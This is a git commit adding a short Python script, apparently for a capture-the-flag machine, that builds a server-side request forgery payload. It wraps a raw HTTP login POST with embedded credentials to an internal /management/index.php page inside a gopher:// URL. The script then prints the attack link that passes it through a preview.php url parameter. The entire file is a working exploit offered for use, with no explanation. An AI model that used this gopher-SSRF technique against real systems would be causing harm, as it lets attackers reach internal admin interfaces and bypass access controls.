8dcac2ecff802eb065e353fbbec4a2c099965d1a
Djalil Ayed <jalilayed@gmail.com>
2025-08-25 14:38:22 +0200

    Create gopher-2.py

---
+++ extract/gopher-2.py
@@ -0,0 +1,16 @@
+# script provided by 0day https://x.com/0dayCTF
+
+python3 - <<'PY'
+import urllib.parse, sys
+body = "username=librarian&password=L1br4r1AN!!"
+req = (
+  "POST /management/index.php HTTP/1.1\r\n"
+  "Host: 127.0.0.1\r\n"
+  "Content-Type: application/x-www-form-urlencoded\r\n"
+  f"Content-Length: {len(body)}\r\n"
+  "Connection: close\r\n"
+  "\r\n" + body
+)
+u = "gopher://127.0.0.1:80/_" + urllib.parse.quote(req, safe='')
+print("http://10.10./preview.php?url=" + urllib.parse.quote(u, safe=''))
+PY
